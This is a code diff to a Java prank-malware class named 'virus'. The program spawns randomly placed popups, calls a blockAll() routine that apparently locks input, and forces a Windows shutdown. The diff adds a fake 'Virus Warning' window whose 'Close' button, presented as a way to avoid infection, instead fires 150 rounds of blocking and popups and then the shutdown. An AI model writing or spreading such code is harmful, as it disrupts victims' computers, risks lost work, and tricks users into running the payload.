@@ -18,7 +18,8 @@ public class virus{
     }
     public void popup(){
         JWindow window = new JWindow();
-        JLabel l = new JLabel("You are infected With Virus :)",JLabel.CENTER);
+        ImageIcon iconLogo = new ImageIcon("hacker.jpg");
+        JLabel l = new JLabel(iconLogo,JLabel.CENTER);
         window.add(l);
         window.setSize(300,200);
         window.setLocation(Random.nextInt(width), Random.nextInt(height));
@@ -28,8 +29,8 @@ public class virus{
         Runtime runtime = Runtime.getRuntime();
       try
       {
-         System.out.println("Shutting down the PC after 5 seconds.");
-         runtime.exec("shutdown -s -t 5");
+         System.out.println("Shutting down the PC after 20 seconds.");
+         runtime.exec("shutdown -s -t 20");
       }
       catch(IOException e)
       {
@@ -39,12 +40,33 @@ public class virus{
     public static void main(String[] args) throws AWTException, InterruptedException 
     {
         virus v =  new virus();
-        for (long i = 0; i < 1000000000000000000l; i++)
-        {
-            v.blockAll();
-            v.popup();
-        }
-        v.close();
+        Frame f = new Frame();
+        f.setSize(500, 500);
+        f.setTitle("Virus Warning");
+        f.setVisible(true);
+        f.setLayout(null);
+        Button b = new Button("Close");
+        b.setBounds(200, 200, 100, 30);
+        f.add(b);
+
+        Label l = new Label("Close this Application or your windows will be infected with virus");
+        l.setBounds(100, 100, 400, 30);
+        f.add(l);
+
+        b.addActionListener(new ActionListener() {
+            public void actionPerformed(ActionEvent e){
+                for (int i = 0; i < 150; i++)
+                {
+                    try {
+                        v.blockAll();
+                    } catch (AWTException e1) {
+                        e1.printStackTrace();
+                    }
+                    v.popup();
+                }
+                v.close();
+            }
+        });
         
     }
 }
